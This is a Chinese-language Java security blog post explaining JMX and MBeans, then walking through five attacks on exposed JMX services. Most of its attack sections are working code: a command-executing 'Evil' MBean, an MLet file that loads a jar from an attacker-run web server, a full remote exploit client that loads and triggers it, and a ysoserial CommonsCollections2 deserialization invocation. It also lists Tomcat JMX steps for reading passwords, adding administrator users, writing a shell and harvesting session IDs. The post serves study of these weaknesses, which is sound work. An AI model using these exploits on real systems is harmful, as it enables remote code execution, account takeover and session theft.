<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="博客">
    <meta name="description" content="最难不过坚持">
    <meta name="author" content="lazysugar">
    
    <title>
        
            JMX攻击 |
        
        lazysugar&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/favicon-32x32.ico">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"1azy.icu","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/favicon-32x32.ico","favicon":"/favicon-32x32.ico","avatar":"/favicon-32x32.ico","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"最难不过坚持.","hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":false},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container border-box">

    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/favicon-32x32.ico">
                </a>
            
            <a class="site-name border-box" href="/">
               lazysugar&#39;s Blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">

                

                    <div class="fade-in-down-animation">
    <div class="post-page-container border-box">

        <div class="article-content-container border-box">

            

            <div class="article-content-bottom border-box">
                
                    <div class="article-title">
                        JMX攻击
                    </div>
                

                
                    <div class="article-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/favicon-32x32.ico">
                            </div>
                        
                        <div class="info-box">
                            <div class="author">
                                <span class="name">lazysugar</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="article-meta-info-container border-box post">
    <div class="article-meta-info border-box">
        


        
            <span class="meta-info-item article-create-date">
                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
                <span class="pc">2023-06-01 02:57:13</span>
                <span class="mobile">2023-06-01 02:57</span>
            </span>

            <span class="meta-info-item article-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="pc" data-updated="Sat Jun 03 2023 04:29:18 GMT+0800">2023-06-03 04:29:18</span>
            </span>
        

        
            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="article-category-ul">
                    
                            <li class="category-item"><a href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="article-tag meta-info-item border-box">
                <i class="icon fas fa-tags"></i>&nbsp;
                <ul class="article-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/JMX/">JMX</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item article-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.4k 字</span>
            </span>
        
        
            <span class="meta-info-item article-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>11 分钟</span>
            </span>
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="article-content keep-markdown-body">
                    

                    <h1 id="JMX介绍"><a href="#JMX介绍" class="headerlink" title="JMX介绍"></a>JMX介绍</h1><p>JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。</p>
<p>用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默认禁用 JMX Tomcat Bean 暴露）。JConsole 或者 VisualVM 它们也用到了 JMX。</p>
<p><img src="/images/20230601171558.png"></p>
<h2 id="MBean"><a href="#MBean" class="headerlink" title="MBean"></a>MBean</h2><p>JMX 是通过各种 MBean(Managed Bean) 传递消息的，MBean 其实就是我们经常说的 Java Bean，只不过由于它比较特殊，所以称之为 MBean。既然是个 Bean，里面就是一些属性和方法，外界就可以获取被管理的资源的状态和操纵MBean的行为。JMX 中共有四种类型的 MBean，分别是 Standard MBean, Dynamic MBean, Open MBean, Model MBean。JDK 提供的 MBean 主要在 java.lang.management 和 javax.management包里面。</p>
<h2 id="MBeanServer"><a href="#MBeanServer" class="headerlink" title="MBeanServer"></a>MBeanServer</h2><p>MBeanServer 是负责管理 MBean 的，一般一个 JVM 只有一个 MBeanServer，所有的 MBean 都要注册到 MBeanServer 上，并通过 MBeanServer 对外提供服务。一般用 ManagementFactory.getPlatformMBeanServer()方法获取当前 JVM 内的 MBeanServer。</p>
<h2 id="适配器和连接器"><a href="#适配器和连接器" class="headerlink" title="适配器和连接器"></a>适配器和连接器</h2><p>写好的 MBean 注册到 MBeanServer 上之后，功能已经具备了。<strong>适配器和连接器就是将这些功能开放出来的方式</strong> 。 比如 HTTP协议适配器，就是将功能以 HTTP 协议开放出去，这样我们就可以在浏览器使用了。</p>
<p><strong>连接器是各种客户端最常用的，JDK 提供的默认连接器是 RMI 连接器，JConsole、VisualVM 都是使用它。</strong></p>
<h1 id="基于RMI的JMX演示"><a href="#基于RMI的JMX演示" class="headerlink" title="基于RMI的JMX演示"></a>基于RMI的JMX演示</h1><pre><code>public class JMXDemo &#123;
    public static void main(String[] args) throws Exception &#123;
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        ObjectName objectName = new ObjectName(&quot;test:type=HelloWorld&quot;);
        Hello mbean = new Hello();
        mBeanServer.registerMBean(mbean, objectName);

        Registry registry = LocateRegistry.createRegistry(1199);
        
        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println(&quot;Server start...&quot;);
    &#125;
&#125;
</code></pre>
<p>拆解：</p>
<ul>
<li>Probe Level</li>
</ul>
<p>实例化HelloMBean类为mbean</p>
<blockquote>
<p>standard MBean：它能管理的资源（包括属性，方法，时间）必须定义在接口中，实例化的MBean必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean。<br>dynamic MBean：必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义。</p>
</blockquote>
<p>代码：</p>
<pre><code>ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
Hello mbean = new Hello();
</code></pre>
<ul>
<li>Agent Level</li>
</ul>
<p>创建了 MBeanServer 实例。<br>主要提供对资源的注册和管理。注册了mbean（具有唯一ObjectName）。</p>
<pre><code>MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
mBeanServer.registerMBean(mbean, objectName);
</code></pre>
<ul>
<li>Remote Management Level</li>
</ul>
<p>创建了JMXServiceURL，绑定到本地1199端口的RMI服务（基于RMI服务的），关联到MBeanServer。</p>
<pre><code>Registry registry = LocateRegistry.createRegistry(1199);
JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
jmxConnectorServer.start();
</code></pre>
<h2 id="使用jconsole图形工具监视、管理JMX"><a href="#使用jconsole图形工具监视、管理JMX" class="headerlink" title="使用jconsole图形工具监视、管理JMX"></a>使用jconsole图形工具监视、管理JMX</h2><p><code>jconsole</code>是基于JMX的可视化监视、管理工具，该工具是JDK的一部分<br>本地可以通过进程方式进行连接，远程可以通过<code>ip:port</code>方式进行连接。</p>
<p>我们连接刚刚创建的rmi服务。</p>
<p><img src="/images/20230601222529.png"></p>
<p>可以用来获取&#x2F;设置bean属性，或调用方法。</p>
<h1 id="攻击一：使用Melt加载远程MBean"><a href="#攻击一：使用Melt加载远程MBean" class="headerlink" title="攻击一：使用Melt加载远程MBean"></a>攻击一：使用Melt加载远程MBean</h1><h2 id="介绍MLet"><a href="#介绍MLet" class="headerlink" title="介绍MLet"></a>介绍MLet</h2><p>Mlet是一个类：<code>javax.management.loading.MLet</code>，这是一个mbean（实现接口<code>MLetMBean</code>）。该mbean存在一个方法<code>getMBeansFromURL</code>，可以从远程<code>mlet server</code>加载mbean。</p>
<p><img src="/images/20230601224936.png"></p>
<p>所以利用Melt攻击流程总结如下：</p>
<ol>
<li>MBeanServer中存在MLet的MBean</li>
<li>利用MLet方法去加载我们恶意server中的Mlet文件</li>
<li>Mlet文件中写入我们恶意jar包服务，被加载</li>
<li>jar包中的恶意Mbean被加载进MBeanServer</li>
<li>通过JMX调用恶意MBean的方法</li>
</ol>
<h2 id="攻击示例与分析"><a href="#攻击示例与分析" class="headerlink" title="攻击示例与分析"></a>攻击示例与分析</h2><p>创建恶意jar文件，用于命令执行</p>
<p>EvilMBean.java:</p>
<pre><code>public interface EvilMBean &#123;
    String runCommand(String cmd);
&#125;
</code></pre>
<p>Evil.java:</p>
<pre><code>public class Evil implements EvilMBean&#123;
    @Override
    public String runCommand(String cmd) &#123;
        try &#123;
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String stdout_err_data = &quot;&quot;;
            String s;
            while ((s = stdInput.readLine()) != null)
            &#123;
                stdout_err_data += s+&quot;\n&quot;;
            &#125;
            while ((s = stdError.readLine()) != null)
            &#123;
                stdout_err_data += s+&quot;\n&quot;;
            &#125;
            proc.waitFor();
            return stdout_err_data;
        &#125;
        catch (Exception e)
        &#123;
            return e.toString();
        &#125;
    &#125;
&#125;
</code></pre>
<p>创建MLet文件，用于指向我们恶意jar包服务</p>
<p><code>mlet.txt</code>:</p>
<pre><code>&lt;html&gt;&lt;mlet code=&quot;Evil&quot; archive=&quot;Evil.jar&quot; name=&quot;MLetCompromise:name=evil,id=1&quot; codebase=&quot;http://127.0.0.1:8000&quot;&gt;&lt;/mlet&gt;&lt;/html&gt;
</code></pre>
<p><code>Evil&quot;</code>为恶意mbean的路径；</p>
<p><code>archive=&quot;Evil.jar&quot;</code>为恶意mbean的jar包；</p>
<p><code>name=&quot;MLetCompromise:name=evil,id=1&quot;</code>可自定义，遵循OBjectname规则；</p>
<p><code>codebase=&quot;http://127.0.0.1:8000&quot;</code>访问为jar包的url。</p>
<p>将Evil.jar和mlet.txt放在同一目录，<code>python3 -m http.server 8000</code>启动web服务。</p>
<p>受害者MBeanServer：</p>
<pre><code>public class MeltJMXDemo &#123;
    public static void main(String[] args) throws Exception &#123;
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        MLet mLet = new MLet();
        ObjectName objectNameMLet = new ObjectName(&quot;JMXMLet:type=MLet&quot;);
        mBeanServer.registerMBean(mLet, objectNameMLet);

        Registry registry = LocateRegistry.createRegistry(1199);

        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println(&quot;MeltJMXServer start...&quot;);
    &#125;
&#125;
</code></pre>
<p>通过jconsole攻击：</p>
<p>本地起一个server，目录下包含我们的恶意melt文件和jar包</p>
<p><img src="/images/20230601232259.png"></p>
<p>通过jconsole调用Melt的<code>getMBeansFromURL</code>方法，参数中填入我们的恶意server地址</p>
<p><img src="/images/20230601232833.png"></p>
<p>我们的恶意MBean被成功加载，通过恶意MBean命令执行</p>
<p><img src="/images/20230601232958.png"></p>
<h1 id="攻击二：远程加载MBean"><a href="#攻击二：远程加载MBean" class="headerlink" title="攻击二：远程加载MBean"></a>攻击二：远程加载MBean</h1><p>JMX Server可以在本地绑定MBean，同时也可以加载远程MBean，并且这一过程我们可以在客户端控制。</p>
<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>随便起一个JMXServer，里面随便绑定了个MBean，并没有绑定MLet</p>
<pre><code>public class JMXDemo &#123;
    public static void main(String[] args) throws Exception &#123;
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
        Hello mbean = new Hello();
        mBeanServer.registerMBean(mbean, objectName);

        Registry registry = LocateRegistry.createRegistry(1199);

        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println(&quot;Server start...&quot;);
    &#125;
&#125;
</code></pre>
<p>通过远程加载MLet，再去加载我们的恶意server中的MBean</p>
<pre><code>public class ExploitJMXByRemoteMBean &#123;
    public static void main(String[] args) throws MalformedURLException &#123;
        connectAndOwn(&quot;127.0.0.1&quot;, &quot;1199&quot;, &quot;ipconfig&quot;);
    &#125;

    static void connectAndOwn(String serverName, String port, String command) throws MalformedURLException &#123;
        try &#123;
            // step1. 通过rmi创建 jmx连接
            JMXServiceURL u = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + serverName + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
            System.out.println(&quot;URL: &quot; + u + &quot;, connecting&quot;);
            JMXConnector c = JMXConnectorFactory.connect(u);
            System.out.println(&quot;Connected: &quot; + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();
            // step2. 加载特殊MBean：javax.management.loading.MLet
            ObjectInstance evil_bean = null;
            ObjectInstance evil = null;
            try &#123;
                evil = m.createMBean(&quot;javax.management.loading.MLet&quot;, null);
            &#125; catch (javax.management.InstanceAlreadyExistsException e) &#123;
                evil = m.getObjectInstance(new ObjectName(&quot;DefaultDomain:type=MLet&quot;));
            &#125;
            // step3：通过MLet加载远程恶意MBean
            System.out.println(&quot;Loaded &quot;+evil.getClassName());
            Object res = m.invoke(evil.getObjectName(), &quot;getMBeansFromURL&quot;, new Object[]
                            &#123; &quot;http://127.0.0.1:8000/mlet.txt&quot; &#125;,
                    new String[] &#123; String.class.getName() &#125; );
            HashSet res_set = ((HashSet)res);
            Iterator itr = res_set.iterator();
            Object nextObject = itr.next();
            // 如果恶意mbean已经存在，则直接获取
            if (nextObject instanceof InstanceAlreadyExistsException)
            &#123;
                //
                evil_bean = m.getObjectInstance(new ObjectName(&quot;MLetCompromise:name=evil,id=1&quot;));
            &#125; else if (nextObject instanceof Exception) &#123;
                throw ((Exception)nextObject);
            &#125; else &#123;
                evil_bean = ((ObjectInstance)nextObject);
            &#125;
            // step4: 执行恶意MBean
            System.out.println(&quot;Loaded class: &quot;+evil_bean.getClassName()+&quot; object &quot;+evil_bean.getObjectName());
            System.out.println(&quot;Calling runCommand with: &quot;+command);
            Object result = m.invoke(evil_bean.getObjectName(), &quot;runCommand&quot;, new Object[]&#123; command &#125;, new String[]&#123; String.class.getName() &#125;);
            System.out.println(&quot;Result: &quot;+result);
        &#125; catch (Exception e)
        &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<p>恶意MBean被加载，成功命令执行</p>
<p><img src="/images/20230601233920.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该攻击需要两个条件：</p>
<ol>
<li>未启用JMX身份验证</li>
<li>可以调用 <code>getMBeansFromURL</code></li>
</ol>
<p>需要设置<code>jmx.remote.x.mlet.allow.getMBeansFromURL=true</code></p>
<pre><code>MBeanServerAccessController：

final String propName =&quot;jmx.remote.x.mlet.allow.getMBeansFromURL&quot;;
GetPropertyAction propAction = new GetPropertyAction(propName);
String propValue = AccessController.doPrivileged(propAction);
boolean allowGetMBeansFromURL =&quot;true&quot;.equalsIgnoreCase(propValue);
if (!allowGetMBeansFromURL) &#123;
    throw new SecurityException(&quot;Access denied! MLet method &quot; +
            &quot;getMBeansFromURLcannot be invoked unless a &quot; +
            &quot;security manageris installed or the system property &quot; +
            &quot;-Djmx.remote.x.mlet.allow.getMBeansFromURL=true&quot; +
            &quot;isspecified.&quot;);
&#125;
</code></pre>
<h1 id="攻击三：通过MBean方法参数反序列化攻击JMX"><a href="#攻击三：通过MBean方法参数反序列化攻击JMX" class="headerlink" title="攻击三：通过MBean方法参数反序列化攻击JMX"></a>攻击三：通过MBean方法参数反序列化攻击JMX</h1><h2 id="JMX调用MBean的流程"><a href="#JMX调用MBean的流程" class="headerlink" title="JMX调用MBean的流程"></a>JMX调用MBean的流程</h2><ol>
<li>将<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>发送给远程<code>rmi server</code>，其中<code>params</code>的处理需要注意下，先转为<code>MarshalledObject</code>，再<code>writeObject</code>为<code>String</code>对象，然后进入网络传输；</li>
<li><code>RMI Server</code>监听到网络请求包含<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>，其中params经过<code>MarshalledObject.readObject()</code>反序列化，再通过<code>invoke</code>调用原函数。</li>
</ol>
<h2 id="攻击示例-1"><a href="#攻击示例-1" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>使用<code>CommonsCollections2</code>链，参考<code>ysoserial.exploit.JMXInvokeMBean</code></p>
<pre><code>public class AttackMBeanParams &#123;

    public static void main(String[] args) throws Exception &#123;

        JMXServiceURL url = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);

        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

        // create the payload
        Object payloadObject = ObjectPayload.Utils.makePayloadObject(&quot;CommonsCollections2&quot;, &quot;calc&quot;);
        ObjectName mbeanName = new ObjectName(&quot;java.util.logging:type=Logging&quot;);

        mbeanServerConnection.invoke(mbeanName, &quot;getLoggerLevel&quot;, new Object[]&#123;payloadObject&#125;, new String[]&#123;String.class.getCanonicalName()&#125;);

        //close the connection
        jmxConnector.close();
    &#125;
&#125;
</code></pre>
<p><img src="/images/20230602000002.png"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>ysoserial用的<code>java.util.logging:type=Logging</code>，换其他ObjectName也行</p>
<p><img src="/images/20230602000218.png"></p>
<h1 id="攻击四：利用中间件等的特殊MBean攻击JMX"><a href="#攻击四：利用中间件等的特殊MBean攻击JMX" class="headerlink" title="攻击四：利用中间件等的特殊MBean攻击JMX"></a>攻击四：利用中间件等的特殊MBean攻击JMX</h1><h2 id="通过JMX攻击Tomcat"><a href="#通过JMX攻击Tomcat" class="headerlink" title="通过JMX攻击Tomcat"></a>通过JMX攻击Tomcat</h2><p>Tomcat中默认不开启JMX服务，需要在catalina.bat中配置启动参数</p>
<pre><code>set &quot;CATALINA_OPTS=%CATALINA_OPTS% -Dcom.sun.management.jmxremote -DJava.rmi.server.hostname=0.0.0.0 -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;
rem   CATALINA_OPTS   (Optional) Java runtime options used when the &quot;start&quot;,
rem                   &quot;run&quot; or &quot;debug&quot; command is executed.
rem                   Include here and not in JAVA_OPTS all options, that should
rem                   only be used by Tomcat itself, not by the stop process,
rem                   the version command etc.
</code></pre>
<p>在9999端口启动一个无认证的JMX服务。</p>
<p>使用jconsole连接到本地tomcat启动的JMX服务。</p>
<h3 id="获取已有用户的密码"><a href="#获取已有用户的密码" class="headerlink" title="获取已有用户的密码"></a>获取已有用户的密码</h3><p><code>User</code>-&gt;<code>&quot;tomcatAdmin&quot;</code>-&gt;<code>UserDatabase</code></p>
<h3 id="添加管理员角色用户"><a href="#添加管理员角色用户" class="headerlink" title="添加管理员角色用户"></a>添加管理员角色用户</h3><ol>
<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，<code>createUser</code>：</p>
</li>
<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，创建角色</p>
</li>
<li><p><code>Users</code>-&gt;<code>User</code>-&gt;<code>[用户名]</code>节点下，将创建的用户与创建的角色关联</p>
</li>
<li><p>保存配置</p>
</li>
</ol>
<h3 id="日志循环函数导致写shell"><a href="#日志循环函数导致写shell" class="headerlink" title="日志循环函数导致写shell"></a>日志循环函数导致写shell</h3><p>Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</p>
<p>boolean rotate(string newFileName)</p>
<h3 id="抓取网络应用的用户的session-ID"><a href="#抓取网络应用的用户的session-ID" class="headerlink" title="抓取网络应用的用户的session ID"></a>抓取网络应用的用户的session ID</h3><p>Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</p>
<h1 id="攻击五：RMI攻击"><a href="#攻击五：RMI攻击" class="headerlink" title="攻击五：RMI攻击"></a>攻击五：RMI攻击</h1><p>因为JMXServer是绑定RMi服务的，所以攻击RMI服务的方式都可以用来攻击JMXServer，这里不再赘述，可以去看RMI攻击的文章</p>

                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/JMX/">JMX</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="article-nav">
                        
                            <div class="article-prev">
                                <a class="prev"
                                   rel="prev"
                                   href="/2023/06/08/JDWP/"
                                   title="JDWP攻击原理分析"
                                >
                                    <span class="left arrow-icon flex-center">
                                      <i class="fas fa-chevron-left"></i>
                                    </span>
                                            <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">JDWP攻击原理分析</span>
                                        <span class="post-nav-item">上一篇</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="article-next">
                                <a class="next"
                                   rel="next"
                                   href="/2023/05/03/fastjson/"
                                   title="fastjson全版本漏洞分析"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">fastjson全版本漏洞分析</span>
                                        <span class="post-nav-item">下一篇</span>
                                    </span>
                                            <span class="right arrow-icon flex-center">
                                      <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JMX%E4%BB%8B%E7%BB%8D"><span class="nav-text">JMX介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MBean"><span class="nav-text">MBean</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MBeanServer"><span class="nav-text">MBeanServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%82%E9%85%8D%E5%99%A8%E5%92%8C%E8%BF%9E%E6%8E%A5%E5%99%A8"><span class="nav-text">适配器和连接器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ERMI%E7%9A%84JMX%E6%BC%94%E7%A4%BA"><span class="nav-text">基于RMI的JMX演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8jconsole%E5%9B%BE%E5%BD%A2%E5%B7%A5%E5%85%B7%E7%9B%91%E8%A7%86%E3%80%81%E7%AE%A1%E7%90%86JMX"><span class="nav-text">使用jconsole图形工具监视、管理JMX</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8Melt%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BMBean"><span class="nav-text">攻击一：使用Melt加载远程MBean</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8DMLet"><span class="nav-text">介绍MLet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-text">攻击示例与分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BA%8C%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDMBean"><span class="nav-text">攻击二：远程加载MBean</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="nav-text">攻击示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%B8%89%EF%BC%9A%E9%80%9A%E8%BF%87MBean%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BBJMX"><span class="nav-text">攻击三：通过MBean方法参数反序列化攻击JMX</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JMX%E8%B0%83%E7%94%A8MBean%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">JMX调用MBean的流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">攻击示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%9B%9B%EF%BC%9A%E5%88%A9%E7%94%A8%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%AD%89%E7%9A%84%E7%89%B9%E6%AE%8AMBean%E6%94%BB%E5%87%BBJMX"><span 